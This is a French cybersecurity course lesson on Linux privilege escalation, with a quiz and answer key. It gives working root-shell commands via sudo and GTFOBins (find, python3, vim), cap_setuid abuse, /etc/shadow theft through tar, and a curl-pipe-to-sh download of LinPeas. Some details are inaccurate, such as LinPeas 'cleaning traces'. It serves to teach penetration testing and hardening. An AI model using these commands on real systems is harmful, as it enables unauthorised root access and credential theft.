# TOME P5 — Cybersécurité Avancée & Red/Blue Team — Jour 203 (6h) : Post-Exploitation & Escalade de Privilèges Linux (SUID/SGID, Linux Capabilities, Sudo Misconfigurations, LinPeas & Exploit Kernel)

> [!NOTE]
> **Objectif du jour :** Maîtriser les techniques d'**Escalade de Privilèges sur les systèmes Linux** (passer d'un utilisateur sans privilèges `www-data` à l'utilisateur suprême `root`) : exploitation des exécutables **SUID/SGID**, mauvaises configurations **Sudo (GTFOBins)**, **Linux Capabilities**, exploitation de vulnérabilités du noyau Linux (Kernel Exploits), et automatisation du nettoyage d'empreintes avec **LinPeas**.
>
> **Compétences visées :** `SEC-06` (A) — Escalade de Privilèges Linux & Post-Exploitation | `SEC-04` (A) — Hardening Linux & Auditing GTFOBins

---

## 1) Module — Énumération Linux & Binaires SUID/SGID (2h)

### 📖 Narration/Intuition

Lorsque vous obtenez un premier accès sur un serveur Linux (ex: via une vulnérabilité RCE dans l'application web de la BCC), vous êtes généralement connecté avec un compte restreint comme `www-data` ou `nobody`. Ce compte ne possède pas les droits nécessaires pour lire la base de données bancaire ou modifier les configurations système.

L'**Escalade de Privilèges (Privilege Escalation)** consiste à exploiter une faiblesse de configuration ou une vulnérabilité logicielle pour élever ses droits vers l'utilisateur `root`.

### 🔍 Anatomie Technique

**Le Bit SUID (Set Owner User ID up on execution) :**

Lorsqu'un binaire possède le bit SUID (`-rwsr-xr-x`), il s'exécute avec les privilèges du **propriétaire du binaire** (souvent `root`), quel que soit l'utilisateur qui le lance. Si ce binaire permet d'exécuter des commandes système ou de lire des fichiers arbitraires, c'est une porte d'entrée directe vers l'accès Root.

```
 -rwsr-xr-x 1 root root 67K  usr/bin/passwd  ──► SUID légitime (Doit modifier /etc/shadow)
 -rwsr-xr-x 1 root root 35K  usr/bin/find    ──► SUID DANGEREUX ! (Permet de spawner un shell root)
    ▲
    └─ le 's' indique le bit SUID actif
```

**Recherche des binaires SUID vulnérables :**

```bash
# Rechercher tous les binaires SUID appartenant à root sur le système
find / -perm -4000 -type f -user root 2>/dev/null

# Binaires SUID classiques exploitables via GTFOBins :
# /usr/bin/find, /usr/bin/vim, /usr/bin/nmap, /usr/bin/cp, /usr/bin/env
```

---

## 2) Module — Sudo Misconfigurations & GTFOBins (2h)

### 📖 Narration/Intuition

La commande `sudo` permet à un utilisateur d'exécuter des commandes spécifiques en tant que root. Les administrateurs système commettent souvent l'erreur d'accorder des droits `sudo` sur des programmes sans réaliser que ces programmes permettent de s'échapper vers un shell (Escape to Shell).

**GTFOBins** est le catalogue mondial des binaires Unix pouvant être détournés pour contourner les restrictions de sécurité et escalader ses privilèges.

### 🔍 Anatomie Technique

**Analyse du fichier `/etc/sudoers` :**

```bash
# Vérifier les droits sudo autorisés pour l'utilisateur actuel
sudo -l

# Exemple de sortie vulnérable :
# User www-data may run the following commands on bcc-server:
#     (ALL : ALL) NOPASSWD: /usr/bin/find, /usr/bin/python3, /usr/bin/vim
```

**Exploitation des vulnérabilités Sudo (GTFOBins) :**

```bash
# ══════════════════════════════════════════════════════════
# EXPLOIT 1 : Sudo avec /usr/bin/find
# ══════════════════════════════════════════════════════════
sudo /usr/bin/find . -exec /bin/sh \; -quit
# Résultat : Shell ROOT immédiat ! (# whoami -> root)

# ══════════════════════════════════════════════════════════
# EXPLOIT 2 : Sudo avec /usr/bin/python3
# ══════════════════════════════════════════════════════════
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'

# ══════════════════════════════════════════════════════════
# EXPLOIT 3 : Sudo avec /usr/bin/vim
# ══════════════════════════════════════════════════════════
sudo /usr/bin/vim -c ':!/bin/sh'

# ══════════════════════════════════════════════════════════
# EXPLOIT 4 : Environment Variable Hijacking (LD_PRELOAD)
# ══════════════════════════════════════════════════════════
# Si sudo -l affiche : "env_keep += LD_PRELOAD"
# On peut injecter une bibliothèque C compilée pour exécuter /bin/sh au lancement
```

---

## 3) Module — Linux Capabilities, Kernel Exploits & LinPeas (2h)

### 📖 Narration/Intuition

**Linux Capabilities** découpent les privilèges de l'utilisateur `root` en petits morceaux indépendants (ex: `CAP_NET_RAW` pour sniffer le réseau, `CAP_DAC_READ_SEARCH` pour lire n'importe quel fichier). Si un binaire non-root possède une capability critique, un attaquant peut l'exploiter pour devenir root.

Si aucune mauvaise configuration n'est trouvée, l'attaquant peut chercher des vulnérabilités dans la version du **Noyau Linux (Kernel Exploit)** (ex: Dirty COW, PwnKit/CVE-2021-4034, Dirty Pipe/CVE-2022-0847).

### 🛠️ Atelier Pratique

**Recherche et Exploitation des Linux Capabilities :**

```bash
# 1. Lister toutes les capabilities attribuées aux binaires sur le système
getcap -r / 2>/dev/null

# Exemple de sortie vulnérable :
# /usr/bin/python3 = cap_setuid+ep
# /usr/bin/tar = cap_dac_read_search+ep

# 2. Exploitation de cap_setuid sur python3
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# Résultat : Shell ROOT !

# 3. Exploitation de cap_dac_read_search sur tar (Lecture de n'importe quel fichier privé)
/usr/bin/tar -cvf shadow.tar /etc/shadow
/usr/bin/tar -xvf shadow.tar
cat etc/shadow # Affichage des hashes de mots de passe de root !
```

**Automatisation de l'énumération avec LinPeas :**

```bash
# Télécharger et exécuter LinPeas (Linux Privilege Escalation Awesome Script)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinPeas colore les résultats :
# 🔴 ROUGE/JAUNE = Vecteur d'escalade de privilèges garanti à 99% !
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **SUID** | Set User ID — Droit d'exécution avec les privilèges du propriétaire du binaire |
| **SGID** | Set Group ID — Droit d'exécution avec les privilèges du groupe du binaire |
| **GTFOBins** | Uncurated list of Unix binaries that can be used to bypass local security restrictions |
| **Capabilities** | Découpage fin des privilèges root dans le noyau Linux |
| **RCE** | Remote Code Execution — Exécution de code à distance |

---

## 🏋️ Exercices & Corrigés

**Exercice 1 :** Quelle est la différence entre le bit **SUID** et la fonction `sudo`, et comment le site **GTFOBins** aide-t-il les pentesteurs à exploiter ces deux mécanismes ?

**Corrigé :** Le bit **SUID** est une permission de fichier système fixée sur un binaire (ex: `/usr/bin/passwd`) : **n'importe quel utilisateur** qui lance ce binaire l'exécute automatiquement avec les privilèges du propriétaire du fichier (souvent root). **Sudo** est un utilitaire système dont la configuration (fichier `/etc/sudoers`) autorise **certains utilisateurs spécifiques** à exécuter des commandes données en tant que root. **GTFOBins** est une base de données de référence qui liste les commandes Unix (ex: `find`, `vim`, `python`, `awk`, `tar`) et fournit les payloads exacts pour s'échapper du binaire et spawner un shell root, que le binaire soit configuré en SUID ou autorisé via `sudo`.

**Exercice 2 :** Qu'est-ce que la capability Linux **`CAP_DAC_READ_SEARCH`** et comment un attaquant peut-il l'exploiter pour obtenir les hashes des mots de passe du serveur ?

**Corrigé :** La capability **`CAP_DAC_READ_SEARCH`** (Discretionary Access Control Read Search) donne au binaire la permission de **contourner toutes les vérifications de permissions de lecture** sur les fichiers et répertoires du système. Si cette capability est attribuée à un binaire comme `tar` ou `python`, un utilisateur ordinaire qui n'a pas les droits de lire `/etc/shadow` (fichier contenant les hashes des mots de passe système accessible uniquement par root) peut utiliser ce binaire pour archiver ou lire `/etc/shadow`, extraire le hash du mot de passe de l'utilisateur `root`, et tenter de le casser par force brute avec John the Ripper ou Hashcat.

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quelle commande Linux permet de rechercher tous les fichiers possédant le bit **SUID** appartenant à `root` sur l'ensemble du système de fichiers ?
- A) `find / -perm -4000 -type f -user root 2>/dev/null`
- B) `ls -la /root`
- C) `cat /etc/passwd`
- D) `grep -r SUID /etc`

**Réponse : A**

**Q2 :** Quel site de référence mondial recense les binaires Unix pouvant être détournés pour élever ses privilèges via Sudo ou SUID ?
- A) GTFOBins
- B) Exploit-DB
- C) GitHub uniquement
- D) OWASP

**Réponse : A**

**Q3 :** Que se passe-t-il si la commande `sudo -l` indique la ligne `(ALL : ALL) NOPASSWD: /usr/bin/find` pour l'utilisateur actuel ?
- A) L'utilisateur peut obtenir un shell `root` instantané en exécutant `sudo /usr/bin/find . -exec /bin/sh \; -quit`
- B) L'utilisateur peut uniquement rechercher des fichiers
- C) L'utilisateur doit saisir le mot de passe de root
- D) Le serveur redémarre automatiquement

**Réponse : A**

**Q4 :** Quel script d'énumération automatique est l'outil standard pour détecter les failles d'escalade de privilèges sur les systèmes Linux ?
- A) LinPeas
- B) Nmap
- C) Burp Suite
- D) Wireshark

**Réponse : A**

**Q5 :** Quelle capability Linux permet à un binaire d'exécuter la fonction `setuid()` pour modifier son identifiant utilisateur vers n'importe quel UID (y compris UID 0 / root) ?
- A) `cap_setuid`
- B) `cap_net_raw`
- C) `cap_sys_admin`
- D) `cap_chown`

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
